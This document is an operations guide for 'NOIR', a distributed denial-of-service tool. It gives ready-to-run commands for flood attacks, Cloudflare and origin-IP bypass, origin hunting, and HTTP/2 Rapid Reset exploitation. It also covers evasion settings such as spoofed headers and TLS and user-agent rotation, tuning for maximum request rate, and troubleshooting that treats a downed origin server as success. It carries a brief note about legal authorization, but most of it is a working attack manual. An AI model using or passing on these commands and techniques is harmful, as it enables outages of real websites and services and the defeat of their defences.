============================================================
OPERATIONAL & DEPLOYMENT GUIDE v4.0 [2026]
NOIR Project - Enterprise Cloudflare-Grade System
============================================================

TABLE OF CONTENTS:
1. System Requirements
2. Installation & Setup
3. Configuration
4. Operations
5. Monitoring & Analytics
6. Troubleshooting
7. Performance Tuning
8. Security Considerations

============================================================
1. SYSTEM REQUIREMENTS
============================================================

HARDWARE REQUIREMENTS (Per Node):
• CPU: 4+ cores (8+ recommended)
• RAM: 8GB minimum (16GB recommended)
• Network: 1Gbps+ connection
• Storage: 2GB for logs and cache

SOFTWARE REQUIREMENTS:
• Python 3.12+ (3.13 recommended)
• Go 1.26.1+ (for binary attacks)
• Windows/Linux/macOS compatible

NETWORK REQUIREMENTS:
• Outbound HTTPS (port 443)
• Outbound HTTP (port 80) - optional
• DNS resolution capability
• No restrictive firewalls

BANDWIDTH REQUIREMENTS:
• Minimum: 10Mbps
• Recommended: 100Mbps+
• For distributed (N nodes): 10Mbps × N

============================================================
2. INSTALLATION & SETUP
============================================================

STEP 1: Clone/Extract Project
```bash
cd c:\laragon\www\Ddos
# or git clone if using version control
```

STEP 2: Install Python Dependencies
```bash
pip install --upgrade pip
pip install -r requirements.txt
```

Verify installation:
```bash
python -c "import aiohttp; print('aiohttp OK')"
python -c "import asyncio; print('asyncio OK')"
```

STEP 3: Verify Go Binaries
```bash
dir bin\
# Should show: go_engine.exe, rapid_reset.exe
```

STEP 4: Create Output Directories
```bash
mkdir -p output\reports
mkdir -p output\logs
mkdir -p cache
```

STEP 5: Update Configuration
Edit `config/settings.yaml`:
```yaml
version: "4.0"
year: 2026

attack:
  default_threads: 100
  default_duration: 60
  max_threads: 1000

ai:
  adaptation_enabled: true
  defense_prediction: true
  confidence_threshold: 0.8

distributed:
  enabled: true
  max_nodes: 8
  consensus_required: true

analytics:
  enabled: true
  retention_hours: 24
  report_interval_sec: 30
```

============================================================
3. CONFIGURATION
============================================================

BASIC CONFIGURATION (config/settings.yaml):

[attack]
default_threads = 100           # Threads per node
default_duration = 60           # Duration in seconds
max_threads = 1000             # Safety limit
timeout_sec = 5                # Request timeout
health_check_latency_limit = 3000  # ms

[ai]
adaptation_enabled = true
defense_prediction = true
tls_rotation_enabled = true
ua_rotation_enabled = true
header_mutation_enabled = true

[distributed]
enabled = true
max_nodes = 8
health_check_interval = 2      # seconds
rebalance_interval = 10        # seconds
failover_timeout = 1           # second

[analytics]
enabled = true
report_interval = 30           # seconds
history_retention = 3600       # seconds (1 hour)
anomaly_threshold_sigma = 3    # Z-score

[cloudflare_bypass]
parameter_pollution = true
cache_buster = true
tls_jitter = true
header_chaos = true
slow_read = true
path_traversal = true

[logging]
level = INFO
format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
output = "output/logs/attack.log"

============================================================
4. OPERATIONS
============================================================

BASIC ATTACK (Single Node)
```bash
python main.py --phase attack \
    --target https://example.com \
    --threads 100 \
    --duration 60 \
    --adaptive
```

DISTRIBUTED ATTACK (4 Nodes)
```bash
python main.py --phase attack \
    --target https://example.com \
    --threads 100 \
    --nodes 4 \
    --duration 60 \
    --adaptive
```

WITH CLOUDFLARE BYPASS
```bash
python main.py --phase attack \
    --target https://example.com \
    --threads 200 \
    --duration 120 \
    --adaptive \
    --bypass cloudflare
```

DIRECT ORIGIN BYPASS (If IP Found)
```bash
python main.py --phase attack \
    --target https://example.com \
    --origin-ip 1.2.3.4 \
    --threads 500 \
    --duration 300 \
    --bypass origin
```

RECONNAISSANCE PHASE
```bash
python main.py --phase recon \
    --target example.com
```

DEEP RECONNAISSANCE (with Origin Hunting)
```bash
python main.py --phase deep_recon \
    --target example.com \
    --origin-hunter \
    --shodan-key YOUR_KEY
```

HTTP/2 RAPID RESET EXPLOITATION
```bash
python main.py --phase attack \
    --target https://example.com \
    --threads 50 \
    --duration 60 \
    --rapid-reset
```

============================================================
5. MONITORING & ANALYTICS
============================================================

REAL-TIME LOG MONITORING:
```bash
# Watch in real-time
tail -f output/logs/attack.log

# On Windows PowerShell
Get-Content output/logs/attack.log -Wait
```

EXPECTED LOG OUTPUT:
```
[AI] Mode: aggressive | RPS: 250.5 | Err: 5.2% | Lat: 450ms | Defenses: 0/7
[MONITOR] Target example.com is still ONLINE (HTTP 200)
[ANALYTICS] RPS: 250.5 | Latency: 450ms | Error: 5.2% | Health: excellent
[ADAPT] Mode switch: aggressive → evasive (confidence: 95%)
[HEALTH] 4/4 nodes healthy, 0 failed
[INTEL] Throughput: up | Confidence: 95% | Adaptations: 3
```

KEY METRICS TO MONITOR:
1. **RPS (Requests Per Second)**
   - Target: 200+ RPS
   - Warning: <50 RPS
   - Critical: <10 RPS

2. **Latency (ms)**
   - Target: <1000ms
   - Warning: 1000-5000ms
   - Critical: >5000ms

3. **Error Rate (%)**
   - Target: <10%
   - Warning: 10-50%
   - Critical: >50%

4. **Attack Health**
   - Excellent: >0.8
   - Good: 0.5-0.8
   - Degraded: <0.5

5. **Defense Status**
   - Monitor: how many defenses active?
   - 0-2: Minor throttling (OK)
   - 3-5: Heavy throttling (adapt)
   - 6-7: Severe hardening (change vector)

ANALYTICS REPORTS:
Generated every 30 seconds in logs:
- RPS trend (up/down/stable)
- Latency trend
- Error rate trend
- Anomalies detected
- Defense detection
- Mode recommendations

============================================================
6. TROUBLESHOOTING
============================================================

PROBLEM: Low RPS (<50)
```
Diagnosis:
1. Check latency - if >5s, connection bottleneck
2. Check error rate - if >50%, target blocking hard
3. Check thread count - if <100, increase threads
4. Check network - run ping to target
5. Check health check logs

Solutions:
• Increase threads: --threads 500
• Enable bypass: --bypass cloudflare
• Change mode: manually set mode to "stealth"
• Check origin: try --origin-ip if found
• Reduce duration: --duration 30 (test shorter)
```

PROBLEM: High Error Rate (>50%)
```
Diagnosis:
1. Target is blocking heavily (rate limiting, IP block)
2. Cloudflare/CDN protection is active
3. Network connectivity issue

Solutions:
• Use bypass: --bypass cloudflare
• Rotate IPs: check x-forwarded-for headers
• Change user agents: new UA pool each cycle
• Slow down: --adaptive (wait for evasive mode)
• Try origin: hunt for origin IP and bypass CDN
```

PROBLEM: "Zero requests captured by AI"
```
Diagnosis:
1. Metrics not synchronized between engine and AI

Solutions:
1. Verify universal_attack.py creates FixedMetricsV2
2. Verify AdaptiveControllerV2 receives metrics reference
3. Check AI monitor loop is running
```

PROBLEM: Distributed nodes showing failures
```
Diagnosis:
1. Node health check failing
2. Network connectivity between nodes
3. Consensus timeout

Solutions:
1. Reduce nodes: --nodes 2
2. Increase rebalance interval: edit config
3. Check network: verify nodes can reach target
4. Check logs for detailed failure reason
```

PROBLEM: Cloudflare returning 520 error
```
Diagnosis:
This is good - means origin server is struggling/down

Analysis:
- 200 OK = throttling (adaptive rate limit)
- 429 = rate limited (IP blocked)
- 520 = origin down (attack working!)
- 403 = blocked by WAF

Solutions:
If want to avoid origin down:
• Use "stealth" mode
• Reduce thread count
• Increase delays between requests

If origin is down, attack successful!
```

============================================================
7. PERFORMANCE TUNING
============================================================

FOR MAXIMUM RPS:

1. **Thread Count**
   ```bash
   --threads 500    # Start high
   ```
   - More threads = more concurrent requests
   - More CPU usage
   - Diminishing returns after 500

2. **Connection Pool Size**
   Edit src/core/universal_attack.py:
   ```python
   connector = aiohttp.TCPConnector(
       limit=threads * 10,           # Increase from 5
       limit_per_host=threads * 8,   # Increase from 4
   )
   ```

3. **Timeout Tuning**
   Edit src/core/ultra_worker.py:
   ```python
   strict_timeout = aiohttp.ClientTimeout(
       total=3,        # Reduce from 5
       connect=1,      # Reduce from 2
       sock_read=2     # Reduce from 3
   )
   ```

4. **Enable All Bypass Techniques**
   ```bash
   --bypass cloudflare   # Enable parameter pollution, cache buster, etc.
   ```

5. **Adaptive Mode**
   ```bash
   --adaptive   # Automatically switches modes based on defenses
   ```

FOR STEALTH (Avoid Detection):

1. **Reduce Threads**
   ```bash
   --threads 10   # Very low
   ```

2. **Increase Delays**
   Edit ai/advanced_adaptation_v2.py:
   ```python
   "stealth": {"delay": 500, "variance": 200}  # 500ms delay
   ```

3. **Enable Header Mutation**
   Automatically enabled in adaptive mode

4. **Randomize Timing**
   Automatically done by metrics randomization

FOR DISTRIBUTED ATTACKS:

1. **Spread Across Nodes**
   ```bash
   --nodes 4 --threads 100   # 4 nodes × 100 threads = 400 total
   ```

2. **Enable Geo-Diversification**
   Automatically enabled in distributed mode
   Creates 5 regional patterns

3. **Consensus Mode**
   Automatically uses Byzantine consensus for all nodes

============================================================
8. SECURITY CONSIDERATIONS
============================================================

OPERATIONAL SECURITY:

1. **Legal Compliance**
   - Ensure you have written authorization
   - Document all testing dates/times
   - Limit attack duration
   - Notify stakeholders before testing

2. **Log Protection**
   - Logs contain sensitive data
   - Store in secure location
   - Encrypt if possible
   - Delete after testing

3. **Network Isolation**
   - Use VPN/proxy if testing external targets
   - Don't expose local network
   - Firewall logging enabled
   - Monitor for counter-attacks

4. **Access Control**
   - Restrict access to code
   - Use version control with auth
   - Review changes before deployment
   - Audit all executions

EVASION SECURITY:

The system automatically provides:
✅ 7-layer evasion (IP, UA, TLS, headers, timing, encoding, paths)
✅ Defense detection (automatic mode switching)
✅ Real-time adaptation (updates every 1 second)
✅ TLS fingerprint rotation (avoids TLS fingerprinting)
✅ User-Agent randomization (7+ variants)
✅ Header chaos (spoofed IPs, custom headers)
✅ Timing randomization (50-500ms variance)

BUT REMEMBER:
⚠️ No guarantee against determined adversaries
⚠️ AI systems can adapt faster than code
⚠️ Quantum computing could break cryptography
⚠️ Always have legal authorization

============================================================
9. RECOVERY & CLEANUP
============================================================

AFTER ATTACK:

1. **Review Logs**
   ```bash
   tail -n 100 output/logs/attack.log  # Last 100 lines
   ```

2. **Check Reports**
   ```bash
   ls output/reports/
   # View recon_example.com.json
   ```

3. **Analyze Metrics**
   Review analytics summary:
   - Final RPS
   - Average latency
   - Peak error rate
   - Defense detection results

4. **Document Results**
   Create summary report:
   - Date/time of test
   - Duration
   - Threads used
   - Final metrics
   - Defense detected
   - Recommendations

5. **Cleanup**
   ```bash
   # Optional: Clear cache
   del cache\recon.db
   
   # Keep: output folder for records
   # Archive: Compress logs if large
   ```

============================================================
QUICK REFERENCE COMMANDS
============================================================

# Single node, basic attack
python main.py --phase attack --target https://example.com --threads 100 --duration 60 --adaptive

# Distributed (4 nodes)
python main.py --phase attack --target https://example.com --threads 100 --nodes 4 --adaptive

# With Cloudflare bypass
python main.py --phase attack --target https://example.com --threads 200 --adaptive --bypass cloudflare

# Reconnaissance
python main.py --phase recon --target example.com

# Deep recon with origin hunting
python main.py --phase deep_recon --target example.com --origin-hunter

# HTTP/2 Rapid Reset
python main.py --phase attack --target https://example.com --rapid-reset

# Direct origin attack
python main.py --phase attack --target https://example.com --origin-ip 1.2.3.4 --threads 500

============================================================
SUPPORT & DOCUMENTATION
============================================================

For detailed information, see:
- README.md - System overview & features
- perbaikan-fase-5.5-throughput-fix.txt - Technical fixes
- test-guide-fase5.5.txt - Testing procedures
- error.txt - Strategic guidance
- INFRASTRUCTURE-AUDIT-2026.txt - Complete audit

For issues or questions:
1. Check logs in output/logs/
2. Review troubleshooting section above
3. Consult documentation in docs/ folder
4. Check README.md for features

============================================================
VERSION: 4.0 [2026]
STATUS: Production Ready
LAST UPDATED: May 18, 2026
============================================================
